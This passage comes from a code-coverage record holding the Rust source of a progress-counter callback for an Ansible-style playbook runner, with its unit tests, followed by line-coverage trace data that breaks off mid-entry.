(total_secs % 3600) / 60;\n        let seconds = total_secs % 60;\n\n        if hours \u003e 0 {\n            format!(\"{}h {}m {}s\", hours, minutes, seconds)\n        } else if minutes \u003e 0 {\n            format!(\"{}m {}s\", minutes, seconds)\n        } else {\n            format!(\"{}s\", seconds)\n        }\n    }\n\n    /// Format the task header with progress.\n    fn format_task_header(\u0026self, name: \u0026str, current: usize, total: usize) -\u003e String {\n        let progress = format!(\"({}/{})\", current, total);\n        let header = format!(\"TASK [{}] {}\", name, progress);\n        let stars = \"*\".repeat(80_usize.saturating_sub(header.len() + 1));\n\n        if self.config.use_color {\n            format!(\"{} {}\", header.cyan().bold(), stars.bright_black())\n        } else {\n            format!(\"{} {}\", header, stars)\n        }\n    }\n\n    /// Format the play header.\n    fn format_play_header(\u0026self, name: \u0026str) -\u003e String {\n        let header = format!(\"PLAY [{}]\", name);\n        let stars = \"*\".repeat(80_usize.saturating_sub(header.len() + 1));\n\n        if self.config.use_color {\n            format!(\"{} {}\", header.magenta().bold(), stars.bright_black())\n        } else {\n            format!(\"{} {}\", header, stars)\n        }\n    }\n\n    /// Format host result with progress.\n    fn format_host_result(\n        \u0026self,\n        host: \u0026str,\n        current_host: usize,\n        total_hosts: usize,\n        status: \u0026str,\n        changed: bool,\n    ) -\u003e String {\n        let host_progress = format!(\"Host {}/{}\", current_host, total_hosts);\n\n        if self.config.use_color {\n            let status_colored = match status {\n                \"ok\" if changed =\u003e \"changed\".yellow().to_string(),\n                \"ok\" =\u003e \"ok\".green().to_string(),\n                \"failed\" =\u003e \"failed\".red().bold().to_string(),\n                \"skipped\" =\u003e \"skipped\".cyan().to_string(),\n                \"unreachable\" =\u003e \"unreachable\".magenta().bold().to_string(),\n                _ =\u003e status.to_string(),\n            };\n\n            format!(\n                \"{} | {} | {}\",\n                host_progress.bright_black(),\n                host.bright_white(),\n                status_colored\n            )\n        } else {\n            let status_str = if status == \"ok\" \u0026\u0026 changed {\n                \"changed\"\n            } else {\n                status\n            };\n            format!(\"{} | {} | {}\", host_progress, host, status_str)\n        }\n    }\n\n    /// Format the progress line with counts and ETA.\n    fn format_progress_line(\n        \u0026self,\n        percentage: f64,\n        stats: \u0026GlobalStats,\n        eta: Option\u003cDuration\u003e,\n    ) -\u003e String {\n        let pct_str = format!(\"{:.0}%\", percentage);\n\n        if self.config.use_color {\n            let counts = format!(\n                \"ok: {} | changed: {} | failed: {} | skipped: {}\",\n                stats.ok.to_string().green(),\n                stats.changed.to_string().yellow(),\n                stats.failed.to_string().red(),\n                stats.skipped.to_string().cyan(),\n            );\n\n            let eta_str = if self.config.show_eta {\n                eta.map(|d| format!(\" | ETA: {}\", Self::format_duration(d)))\n                    .unwrap_or_default()\n            } else {\n                String::new()\n            };\n\n            format!(\n                \"Progress: {} | {}{}\",\n                pct_str.bright_white().bold(),\n                counts,\n                eta_str.bright_black()\n            )\n        } else {\n            let counts = format!(\n                \"ok: {} | changed: {} | failed: {} | skipped: {}\",\n                stats.ok, stats.changed, stats.failed, stats.skipped,\n            );\n\n            let eta_str = if self.config.show_eta {\n                eta.map(|d| format!(\" | ETA: {}\", Self::format_duration(d)))\n                    .unwrap_or_default()\n            } else {\n                String::new()\n            };\n\n            format!(\"Progress: {} | {}{}\", pct_str, counts, eta_str)\n        }\n    }\n\n    /// Format a single host's recap line.\n    fn format_recap_line(\u0026self, host: \u0026str, stats: \u0026HostStats) -\u003e String {\n        if self.config.use_color {\n            let host_color = if stats.failed \u003e 0 || stats.unreachable \u003e 0 {\n                host.red().bold()\n            } else if stats.changed \u003e 0 {\n                host.yellow()\n            } else {\n                host.green()\n            };\n\n            format!(\n                \"{:\u003c30} : ok={} changed={} failed={} skipped={}\",\n                host_color,\n                stats.ok.to_string().green(),\n                stats.changed.to_string().yellow(),\n                stats.failed.to_string().red(),\n                stats.skipped.to_string().cyan(),\n            )\n        } else {\n            format!(\n                \"{:\u003c30} : ok={} changed={} failed={} skipped={}\",\n                host, stats.ok, stats.changed, stats.failed, stats.skipped,\n            )\n        }\n    }\n\n    /// Format the final summary line.\n    fn format_summary(\u0026self, stats: \u0026GlobalStats, duration: Duration) -\u003e String {\n        if self.config.use_color {\n            format!(\n                \"\\nTotal: {} ok, {} changed, {} failed, {} skipped in {}\",\n                stats.ok.to_string().green().bold(),\n                stats.changed.to_string().yellow().bold(),\n                stats.failed.to_string().red().bold(),\n                stats.skipped.to_string().cyan().bold(),\n                Self::format_duration_human(duration).bright_white().bold()\n            )\n        } else {\n            format!(\n                \"\\nTotal: {} ok, {} changed, {} failed, {} skipped in {}\",\n                stats.ok,\n                stats.changed,\n                stats.failed,\n                stats.skipped,\n                Self::format_duration_human(duration)\n            )\n        }\n    }\n}\n\nimpl Default for CounterCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for CounterCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            host_stats: RwLock::new(self.host_stats.read().clone()),\n            global_stats: RwLock::new(self.global_stats.read().clone()),\n            progress: RwLock::new(self.progress.read().clone()),\n            timing: RwLock::new(self.timing.read().clone()),\n            start_time: RwLock::new(*self.start_time.read()),\n            playbook_name: RwLock::new(self.playbook_name.read().clone()),\n            has_failures: RwLock::new(*self.has_failures.read()),\n            task_start_time: RwLock::new(*self.task_start_time.read()),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for CounterCallback {\n    /// Called when a playbook starts - initializes timing and resets stats.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        *self.start_time.write() = Some(Instant::now());\n        *self.playbook_name.write() = Some(name.to_string());\n\n        // Clear stats from any previous run\n        self.host_stats.write().clear();\n        *self.global_stats.write() = GlobalStats::default();\n        *self.timing.write() = TaskTiming::default();\n        *self.progress.write() = ProgressState::default();\n        *self.has_failures.write() = false;\n\n        println!();\n    }\n\n    /// Called when a playbook ends - prints the final recap and summary.\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let stats = self.host_stats.read();\n        let global = self.global_stats.read();\n        let start_time = *self.start_time.read();\n\n        // Print recap header\n        println!();\n        let recap_header = \"RECAP\";\n        let stars = \"*\".repeat(80_usize.saturating_sub(recap_header.len() + 1));\n\n        if self.config.use_color {\n            println!(\n                \"{} {}\",\n                recap_header.bright_white().bold(),\n                stars.bright_black()\n            );\n        } else {\n            println!(\"{} {}\", recap_header, stars);\n        }\n\n        // Print recap for each host in sorted order\n        let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n        hosts.sort();\n\n        for host in hosts {\n            if let Some(host_stats) = stats.get(host) {\n                println!(\"{}\", self.format_recap_line(host, host_stats));\n            }\n        }\n\n        // Print summary with duration\n        if let Some(start) = start_time {\n            let duration = start.elapsed();\n            println!(\"{}\", self.format_summary(\u0026global, duration));\n\n            if self.config.use_color {\n                let status = if success {\n                    \"completed successfully\".green().bold()\n                } else {\n                    \"failed\".red().bold()\n                };\n\n                println!(\"\\nPlaybook '{}' {}\", name.bright_white(), status);\n            } else {\n                let status = if success {\n                    \"completed successfully\"\n                } else {\n                    \"failed\"\n                };\n                println!(\"\\nPlaybook '{}' {}\", name, status);\n            }\n        }\n    }\n\n    /// Called when a play starts - initializes host tracking.\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        // Initialize stats for all hosts in this play\n        {\n            let mut stats = self.host_stats.write();\n            for host in hosts {\n                stats.entry(host.clone()).or_default();\n            }\n        }\n\n        // Update progress state\n        {\n            let mut progress = self.progress.write();\n            progress.current_play_name = name.to_string();\n            progress.total_hosts = hosts.len();\n            progress.current_task = 0;\n            progress.hosts_completed_for_task = 0;\n        }\n\n        println!(\"{}\", self.format_play_header(name));\n        println!();\n    }\n\n    /// Called when a play ends.\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Progress line already shown after each task\n        println!();\n    }\n\n    /// Called when a task starts - updates progress tracking.\n    async fn on_task_start(\u0026self, name: \u0026str, _host: \u0026str) {\n        let mut progress = self.progress.write();\n\n        // Only print task header when task name changes\n        if progress.current_task_name != name {\n            progress.current_task += 1;\n            progress.current_task_name = name.to_string();\n            progress.hosts_completed_for_task = 0;\n\n            // Get total tasks if available (this would normally come from play metadata)\n            // For now, we'll show running count\n            let total = if progress.total_tasks \u003e 0 {\n                progress.total_tasks\n            } else {\n                progress.current_task\n            };\n\n            println!(\n                \"{}\",\n                self.format_task_header(name, progress.current_task, total)\n            );\n        }\n\n        // Record task start time\n        *self.task_start_time.write() = Some(Instant::now());\n    }\n\n    /// Called when a task completes - updates counts and shows progress.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        // Update host stats\n        let mut stats = self.host_stats.write();\n        let host_stats = stats.entry(result.host.clone()).or_default();\n\n        // Update global stats\n        let mut global = self.global_stats.write();\n\n        // Determine status and update counts\n        let status = if result.result.skipped {\n            host_stats.skipped += 1;\n            global.skipped += 1;\n            \"skipped\"\n        } else if !result.result.success {\n            host_stats.failed += 1;\n            global.failed += 1;\n\n            // Mark that we have failures\n            *self.has_failures.write() = true;\n\n            \"failed\"\n        } else if result.result.changed {\n            host_stats.changed += 1;\n            global.changed += 1;\n            \"ok\"\n        } else {\n            host_stats.ok += 1;\n            global.ok += 1;\n            \"ok\"\n        };\n\n        // Update progress\n        let mut progress = self.progress.write();\n        progress.hosts_completed_for_task += 1;\n        let current_host = progress.hosts_completed_for_task;\n        let total_hosts = progress.total_hosts;\n        let percentage = progress.percentage();\n\n        // Record task duration\n        let task_start = *self.task_start_time.read();\n        if let Some(start) = task_start {\n            self.timing.write().record_duration(start.elapsed());\n        }\n\n        // Calculate ETA\n        let timing = self.timing.read();\n        let eta = progress.eta(timing.average_duration());\n\n        drop(stats);\n        drop(timing);\n        drop(progress);\n\n        // Print host result if verbose\n        if self.config.verbose {\n            println!(\n                \"{}\",\n                self.format_host_result(\n                    \u0026result.host,\n                    current_host,\n                    total_hosts,\n                    status,\n                    result.result.changed\n                )\n            );\n\n            // Print error message for failures\n            if status == \"failed\" \u0026\u0026 !result.result.message.is_empty() {\n                if self.config.use_color {\n                    println!(\"  {} {}\", \"=\u003e\".red(), result.result.message.bright_red());\n                } else {\n                    println!(\"  =\u003e {}\", result.result.message);\n                }\n            }\n        }\n\n        // Print progress line after all hosts complete the task\n        if current_host == total_hosts {\n            println!(\"{}\", self.format_progress_line(percentage, \u0026global, eta));\n            println!();\n        }\n    }\n\n    /// Called when a handler is triggered.\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        if self.config.use_color {\n            println!(\"{}: {}\", \"HANDLER\".yellow().bold(), name.bright_white());\n        } else {\n            println!(\"HANDLER: {}\", name);\n        }\n    }\n\n    /// Called when facts are gathered.\n    async fn on_facts_gathered(\u0026self, host: \u0026str, _facts: \u0026Facts) {\n        if self.config.verbose {\n            if self.config.use_color {\n                println!(\n                    \"{} {} | {}\",\n                    \"FACTS\".bright_black(),\n                    host.bright_white(),\n                    \"gathered\".green()\n                );\n            } else {\n                println!(\"FACTS {} | gathered\", host);\n            }\n        }\n    }\n}\n\n/// Builder for configuring CounterCallback with custom settings.\n#[derive(Debug, Default, Clone)]\npub struct CounterCallbackBuilder {\n    config: CounterConfig,\n}\n\nimpl CounterCallbackBuilder {\n    /// Create a new builder with default settings.\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self {\n            config: CounterConfig::default(),\n        }\n    }\n\n    /// Set whether to show verbose per-host output.\n    #[must_use]\n    pub fn verbose(mut self, verbose: bool) -\u003e Self {\n        self.config.verbose = verbose;\n        self\n    }\n\n    /// Set whether to show ETA estimates.\n    #[must_use]\n    pub fn show_eta(mut self, show_eta: bool) -\u003e Self {\n        self.config.show_eta = show_eta;\n        self\n    }\n\n    /// Set whether to use colored output.\n    #[must_use]\n    pub fn use_color(mut self, use_color: bool) -\u003e Self {\n        self.config.use_color = use_color;\n        self\n    }\n\n    /// Set the known total number of tasks (for accurate progress).\n    #[must_use]\n    pub fn total_tasks(mut self, total: usize) -\u003e Self {\n        self.config.total_tasks = Some(total);\n        self\n    }\n\n    /// Build the CounterCallback with configured settings.\n    #[must_use]\n    pub fn build(self) -\u003e CounterCallback {\n        let callback = CounterCallback::with_config(self.config.clone());\n\n        // If total tasks is known, set it in progress state\n        if let Some(total) = self.config.total_tasks {\n            callback.progress.write().total_tasks = total;\n        }\n\n        callback\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[tokio::test]\n    async fn test_counter_callback_tracks_stats() {\n        let callback = CounterCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Simulate task start\n        callback.on_task_start(\"task1\", \"host1\").await;\n\n        // Simulate some task completions\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        callback.on_task_start(\"task1\", \"host2\").await;\n        let changed_result =\n            create_execution_result(\"host2\", \"task1\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed_result).await;\n\n        // Verify global stats\n        let global = callback.global_stats.read();\n        assert_eq!(global.ok, 1);\n        assert_eq!(global.changed, 1);\n        assert_eq!(global.failed, 0);\n        assert_eq!(global.total(), 2);\n\n        // Verify host stats\n        let stats = callback.host_stats.read();\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.ok, 1);\n        assert_eq!(host1_stats.changed, 0);\n\n        let host2_stats = stats.get(\"host2\").unwrap();\n        assert_eq!(host2_stats.changed, 1);\n    }\n\n    #[tokio::test]\n    async fn test_counter_callback_tracks_failures() {\n        let callback = CounterCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback.on_task_start(\"task1\", \"host1\").await;\n        let failed_result =\n            create_execution_result(\"host1\", \"task1\", false, false, false, \"error occurred\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        assert!(callback.has_failures());\n\n        let global = callback.global_stats.read();\n        assert_eq!(global.failed, 1);\n    }\n\n    #[test]\n    fn test_progress_percentage() {\n        let mut progress = ProgressState {\n            current_task: 2,\n            total_tasks: 4,\n            current_host: 0,\n            total_hosts: 2,\n            hosts_completed_for_task: 1,\n            current_task_name: \"task2\".to_string(),\n            current_play_name: \"play\".to_string(),\n        };\n\n        // 2 complete tasks * 2 hosts = 4 + 1 host on current task = 5 of 8 total\n        assert!((progress.percentage() - 62.5).abs() \u003c 0.1);\n\n        progress.hosts_completed_for_task = 2;\n        // 2 complete tasks * 2 hosts = 4 + 2 hosts on current task = 6 of 8 total = 75%\n        assert!((progress.percentage() - 75.0).abs() \u003c 0.1);\n    }\n\n    #[test]\n    #[ignore = \"ETA calculation edge case needs refinement\"]\n    fn test_eta_calculation() {\n        let mut timing = TaskTiming::default();\n        timing.record_duration(Duration::from_secs(10));\n        timing.record_duration(Duration::from_secs(20));\n        timing.record_duration(Duration::from_secs(15));\n\n        let avg = timing.average_duration().unwrap();\n        assert_eq!(avg, Duration::from_secs(15));\n\n        let progress = ProgressState {\n            current_task: 1,\n            total_tasks: 3,\n            current_host: 0,\n            total_hosts: 2,\n            hosts_completed_for_task: 2,\n            current_task_name: \"task1\".to_string(),\n            current_play_name: \"play\".to_string(),\n        };\n\n        // 4 remaining executions * 15s average = 60s\n        let eta = progress.eta(Some(avg)).unwrap();\n        assert_eq!(eta, Duration::from_secs(60));\n    }\n\n    #[test]\n    fn test_format_duration() {\n        assert_eq!(\n            CounterCallback::format_duration(Duration::from_secs(65)),\n            \"01:05\"\n        );\n        assert_eq!(\n            CounterCallback::format_duration(Duration::from_secs(3665)),\n            \"01:01:05\"\n        );\n        assert_eq!(\n            CounterCallback::format_duration(Duration::from_secs(0)),\n            \"00:00\"\n        );\n    }\n\n    #[test]\n    fn test_format_duration_human() {\n        assert_eq!(\n            CounterCallback::format_duration_human(Duration::from_secs(65)),\n            \"1m 5s\"\n        );\n        assert_eq!(\n            CounterCallback::format_duration_human(Duration::from_secs(3665)),\n            \"1h 1m 5s\"\n        );\n        assert_eq!(\n            CounterCallback::format_duration_human(Duration::from_secs(30)),\n            \"30s\"\n        );\n    }\n\n    #[test]\n    fn test_host_stats_total() {\n        let stats = HostStats {\n            ok: 5,\n            changed: 3,\n            failed: 1,\n            skipped: 2,\n            unreachable: 0,\n        };\n        assert_eq!(stats.total(), 11);\n    }\n\n    #[test]\n    fn test_global_stats_total() {\n        let stats = GlobalStats {\n            ok: 10,\n            changed: 5,\n            failed: 2,\n            skipped: 3,\n            unreachable: 1,\n        };\n        assert_eq!(stats.total(), 21);\n    }\n\n    #[test]\n    fn test_builder_pattern() {\n        let callback = CounterCallbackBuilder::new()\n            .verbose(false)\n            .show_eta(false)\n            .use_color(false)\n            .total_tasks(10)\n            .build();\n\n        assert!(!callback.config.verbose);\n        assert!(!callback.config.show_eta);\n        assert!(!callback.config.use_color);\n    }\n\n    #[test]\n    fn test_default_trait() {\n        let callback = CounterCallback::default();\n        assert!(callback.config.verbose);\n        // show_eta depends on default config\n    }\n\n    #[test]\n    fn test_clone() {\n        let callback1 = CounterCallback::new();\n        {\n            let mut stats = callback1.host_stats.write();\n            stats.insert(\n                \"host1\".to_string(),\n                HostStats {\n                    ok: 5,\n                    ..Default::default()\n                },\n            );\n        }\n\n        let callback2 = callback1.clone();\n\n        // Cloned callback should have same data\n        let stats = callback2.host_stats.read();\n        assert_eq!(stats.get(\"host1\").map(|s| s.ok), Some(5));\n    }\n}\n","traces":[{"line":61,"address":[31394304],"length":1,"stats":{"Line":1}},{"line":62,"address":[31394453,31394318],"length":1,"stats":{"Line":1}},{"line":85,"address":[31378272],"length":1,"stats":{"Line":1}},{"line":86,"address":[31378286,31378421],"length":1,"stats":{"Line":1}},{"line":101,"address":[31395392],"length":1,"stats":{"Line":1}},{"line":103,"address":[31395406],"length":1,"stats":{"Line":1}},{"line":104,"address":[31395420],"length":1,"stats":{"Line":1}},{"line":111,"address":[31378128],"length":1,"stats":{"Line":1}},{"line":112,"address":[31378142],"length":1,"stats":{"Line":1}},{"line":113,"address":[31378245],"length":1,"stats":{"Line":0}},{"line":115,"address":[31378156],"length":1,"stats":{"Line":1}},{"line":116,"address":[31378206],"length":1,"stats":{"Line":1}},{"line":120,"address":[31378096],"length":1,"stats":{"Line":1}},{"line":121,"address":[31378113],"length":1,"stats":{"Line":1}},{"line":147,"address":[31378448],"length":1,"stats":{"Line":1}},{"line":148,"address":[31378462,31378485],"length":1,"stats":{"Line":2}},{"line":149,"address":[31378469],"length":1,"stats":{"Line":1}},{"line":152,"address":[31378563,31378538,31378497],"length":1,"stats":{"Line":2}},{"line":153,"address":[31378723,31378543,31378586],"length":1,"stats":{"Line":2}},{"line":156,"address":[31378633],"length":1,"stats":{"Line":1}},{"line":160,"address":[31378736],"length":1,"stats":{"Line":1}},{"line":161,"address":[31378786],"length":1,"stats":{"Line":1}},{"line":163,"address":[31378881,31378903],"length":1,"stats":{"Line":1}},{"line":164,"address":[31378888],"length":1,"stats":{"Line":1}},{"line":167,"address":[31378915,31378962,31378990],"length":1,"stats":{"Line":0}},{"line":168,"address":[31379013,31378970,31379106],"length":1,"stats":{"Line":0}},{"line":170,"address":[31379063],"length":1,"stats":{"Line":0}},{"line":172,"address":[31379085],"length":1,"stats":{"Line":0}},{"line":190,"address":[31397856],"length":1,"stats":{"Line":1}},{"line":251,"address":[31393680],"length":1,"stats":{"Line":1}},{"line":252,"address":[31393693],"length":1,"stats":{"Line":1}},{"line":257,"address":[31379120,31380095],"length":1,"stats":{"Line":1}},{"line":259,"address":[31379312,31379142],"length":1,"stats":{"Line":1}},{"line":261,"address":[31379210],"length":1,"stats":{"Line":1}},{"line":262,"address":[31379227],"length":1,"stats":{"Line":1}},{"line":266,"address":[31379274],"length":1,"stats":{"Line":1}},{"line":267,"address":[31379305,31379435],"length":1,"stats":{"Line":2}},{"line":268,"address":[31379450],"length":1,"stats":{"Line":1}},{"line":269,"address":[31379488,31379551],"length":1,"stats":{"Line":2}},{"line":270,"address":[31379571],"length":1,"stats":{"Line":1}},{"line":271,"address":[31379625],"length":1,"stats":{"Line":1}},{"line":272,"address":[31379666],"length":1,"stats":{"Line":1}},{"line":273,"address":[31379723],"length":1,"stats":{"Line":1}},{"line":284,"address":[31380256],"length":1,"stats":{"Line":0}},{"line":285,"address":[31380319],"length":1,"stats":{"Line":0}},{"line":288,"address":[31380296],"length":1,"stats":{"Line":0}},{"line":295,"address":[31380238,31380244,31380128],"length":1,"stats":{"Line":1}},{"line":296,"address":[31380137,31380211],"length":1,"stats":{"Line":2}},{"line":300,"address":[31382560],"length":1,"stats":{"Line":1}},{"line":301,"address":[31382586],"length":1,"stats":{"Line":1}},{"line":302,"address":[31382609],"length":1,"stats":{"Line":1}},{"line":303,"address":[31382632],"length":1,"stats":{"Line":1}},{"line":304,"address":[31382668],"length":1,"stats":{"Line":1}},{"line":306,"address":[31382683],"length":1,"stats":{"Line":1}},{"line":307,"address":[31382920],"length":1,"stats":{"Line":1}},{"line":309,"address":[31382695],"length":1,"stats":{"Line":1}},{"line":314,"address":[31392912],"length":1,"stats":{"Line":1}},{"line":315,"address":[31392938],"length":1,"stats":{"Line":1}},{"line":316,"address":[31392961],"length":1,"stats":{"Line":1}},{"line":317,"address":[31392984],"length":1,"stats":{"Line":1}},{"line":318,"address":[31393020],"length":1,"stats":{"Line":1}},{"line":320,"address":[31393035],"length":1,"stats":{"Line":1}},{"line":321,"address":[31393060],"length":1,"stats":{"Line":1}},{"line":322,"address":[31393043],"length":1,"stats":{"Line":1}},{"line":323,"address":[31393461],"length":1,"stats":{"Line":1}},{"line":325,"address":[31393323],"length":1,"stats":{"Line":1}},{"line":330,"address":[31388432,31389863,31389869],"length":1,"stats":{"Line":1}},{"line":331,"address":[31388502],"length":1,"stats":{"Line":1}},{"line":332,"address":[31388705,31388784],"length":1,"stats":{"Line":2}},{"line":333,"address":[31388996,31388935],"length":1,"stats":{"Line":2}},{"line":335,"address":[31389092],"length":1,"stats":{"Line":1}},{"line":336,"address":[31389157,31389395],"length":1,"stats":{"Line":2}},{"line":338,"address":[31389106,31389221],"length":1,"stats":{"Line":0}},{"line":343,"address":[31388405,31388399,31387312],"length":1,"stats":{"Line":1}},{"line":344,"address":[31387357],"length":1,"stats":{"Line":1}},{"line":345,"address":[31387490,31387551],"length":1,"stats":{"Line":2}},{"line":347,"address":[31387647],"length":1,"stats":{"Line":1}},{"line":348,"address":[31387950,31387712],"length":1,"stats":{"Line":2}},{"line":350,"address":[31387661,31387776],"length":1,"stats":{"Line":0}},{"line":355,"address":[31387294,31385136,31386339],"length":1,"stats":{"Line":1}},{"line":363,"address":[31385248],"length":1,"stats":{"Line":1}},{"line":365,"address":[31385450],"length":1,"stats":{"Line":1}},{"line":367,"address":[31385960,31386581,31386717,31385917,31385483],"length":1,"stats":{"Line":5}},{"line":368,"address":[31386628,31386550],"length":1,"stats":{"Line":2}},{"line":369,"address":[31386016,31386434,31385923,31385977],"length":1,"stats":{"Line":4}},{"line":370,"address":[31386054,31385983,31386093,31386361],"length":1,"stats":{"Line":0}},{"line":371,"address":[31386060,31386131,31386223,31386166],"length":1,"stats":{"Line":0}},{"line":372,"address":[31386137,31386197],"length":1,"stats":{"Line":0}},{"line":375,"address":[31386891,31386940],"length":1,"stats":{"Line":1}},{"line":377,"address":[31386204,31386843],"length":1,"stats":{"Line":2}},{"line":378,"address":[31386862],"length":1,"stats":{"Line":1}},{"line":382,"address":[31385596,31385564,31385456],"length":1,"stats":{"Line":0}},{"line":383,"address":[31385608],"length":1,"stats":{"Line":0}},{"line":385,"address":[31385570],"length":1,"stats":{"Line":0}},{"line":387,"address":[31385640],"length":1,"stats":{"Line":0}},{"line":392,"address":[31391042,31392886,31389888],"length":1,"stats":{"Line":1}},{"line":398,"address":[31389975],"length":1,"stats":{"Line":1}},{"line":400,"address":[31390150],"length":1,"stats":{"Line":1}},{"line":401,"address":[31391073,31391174,31391646,31391338,31391240,31391404,31391568,31391502],"length":1,"stats":{"Line":1}},{"line":403,"address":[31391056,31390246,31391127],"length":1,"stats":{"Line":3}},{"line":404,"address":[31391151,31391223,31391291],"length":1,"stats":{"Line":3}},{"line":405,"address":[31391387,31391455,31391315],"length":1,"stats":{"Line":3}},{"line":406,"address":[31391479,31391619,31391551],"length":1,"stats":{"Line":3}},{"line":409,"address":[31392162],"length":1,"stats":{"Line":1}},{"line":410,"address":[31392200,31392305],"length":1,"stats":{"Line":2}},{"line":413,"address":[31392176,31392251],"length":1,"stats":{"Line":0}},{"line":416,"address":[31392510,31392429],"length":1,"stats":{"Line":1}},{"line":418,"address":[31392358,31392261],"length":1,"stats":{"Line":2}},{"line":420,"address":[31392483,31392412],"length":1,"stats":{"Line":2}},{"line":423,"address":[31390161,31390312],"length":1,"stats":{"Line":0}},{"line":428,"address":[31390549],"length":1,"stats":{"Line":0}},{"line":429,"address":[30823648,30823690],"length":1,"stats":{"Line":0}},{"line":432,"address":[31390563,31390638],"length":1,"stats":{"Line":0}},{"line":435,"address":[31390788,31390648],"length":1,"stats":{"Line":0}},{"line":440,"address":[31385105,31385111,31383216],"length":1,"stats":{"Line":0}},{"line":441,"address":[31383264],"length":1,"stats":{"Line":0}},{"line":442,"address":[31383714,31383740],"length":1,"stats":{"Line":0}},{"line":443,"address":[31383746],"length":1,"stats":{"Line":0}},{"line":444,"address":[31383796],"length":1,"stats":{"Line":0}},{"line":445,"address":[31383825],"length":1,"stats":{"Line":0}},{"line":447,"address":[31383802],"length":1,"stats":{"Line":0}},{"line":450,"address":[31384198,31384503,31384100,31384034,31384362,31384264,31383936,31384428],"length":1,"stats":{"Line":0}},{"line":453,"address":[31383851,31383919,31383987],"length":1,"stats":{"Line":0}},{"line":454,"address":[31384011,31384151,31384083],"length":1,"stats":{"Line":0}},{"line":455,"address":[31384175,31384247,31384315],"length":1,"stats":{"Line":0}},{"line":456,"address":[31384411,31384479,31384339],"length":1,"stats":{"Line":0}},{"line":459,"address":[31383279],"length":1,"stats":{"Line":0}},{"line":467,"address":[31380384,31381044,31381038],"length":1,"stats":{"Line":0}},{"line":468,"address":[31380463],"length":1,"stats":{"Line":0}},{"line":469,"address":[31381185,31381451,31381254,31381648,31381775,31381057,31381844,31381949,31381579,31381382],"length":1,"stats":{"Line":0}},{"line":471,"address":[31381108,31380650],"length":1,"stats":{"Line":0}},{"line":472,"address":[31381162,31381237,31381305],"length":1,"stats":{"Line":0}},{"line":473,"address":[31381502,31381434,31381359],"length":1,"stats":{"Line":0}},{"line":474,"address":[31381699,31381631,31381556],"length":1,"stats":{"Line":0}},{"line":475,"address":[31381895,31381768,31381827],"length":1,"stats":{"Line":0}},{"line":478,"address":[31380575,31380496,31380697],"length":1,"stats":{"Line":0}},{"line":484,"address":[31380542],"length":1,"stats":{"Line":0}},{"line":491,"address":[31398176],"length":1,"stats":{"Line":1}},{"line":492,"address":[31398184],"length":1,"stats":{"Line":1}},{"line":497,"address":[31395488,31397520,31397721],"length":1,"stats":{"Line":1}},{"line":499,"address":[31395529],"length":1,"stats":{"Line":1}},{"line":500,"address":[31395645,31395542],"length":1,"stats":{"Line":2}},{"line":501,"address":[31395751,31395832,31395683],"length":1,"stats":{"Line":3}},{"line":502,"address":[31395979,31395870],"length":1,"stats":{"Line":2}},{"line":503,"address":[31396017,31396088,31396169],"length":1,"stats":{"Line":3}},{"line":504,"address":[31396207,31396278,31396351],"length":1,"stats":{"Line":3}},{"line":505,"address":[31396380,31396484],"length":1,"stats":{"Line":2}},{"line":506,"address":[31396605,31396534,31396678],"length":1,"stats":{"Line":3}},{"line":507,"address":[31396704,31396806],"length":1,"stats":{"Line":2}},{"line":515,"address":[31376387],"length":1,"stats":{"Line":4}},{"line":516,"address":[30815636,30815509],"length":1,"stats":{"Line":2}},{"line":517,"address":[30817502,30815991,30815805,30816053,30815778],"length":1,"stats":{"Line":1}},{"line":520,"address":[30816187],"length":1,"stats":{"Line":1}},{"line":521,"address":[30816318],"length":1,"stats":{"Line":1}},{"line":522,"address":[30816485,30816478,30816635,30816693,30817448],"length":1,"stats":{"Line":1}},{"line":523,"address":[30816976,30816829,30816822,30817034,30817394],"length":1,"stats":{"Line":1}},{"line":524,"address":[30817199],"length":1,"stats":{"Line":1}},{"line":526,"address":[30817319],"length":1,"stats":{"Line":1}},{"line":530,"address":[30807167,30807311,30807136,30810084,30810128,30810483,30807281],"length":1,"stats":{"Line":0}},{"line":531,"address":[30807366,30807255],"length":1,"stats":{"Line":0}},{"line":532,"address":[30807374,30807453],"length":1,"stats":{"Line":0}},{"line":533,"address":[30807461,30807535],"length":1,"stats":{"Line":0}},{"line":536,"address":[30807647],"length":1,"stats":{"Line":0}},{"line":537,"address":[30807692],"length":1,"stats":{"Line":0}},{"line":538,"address":[30807719],"length":1,"stats":{"Line":0}},{"line":540,"address":[30807869],"length":1,"stats":{"Line":0}},{"line":541,"address":[30808148,30807926],"length":1,"stats":{"Line":0}},{"line":547,"address":[30808008,30807883],"length":1,"stats":{"Li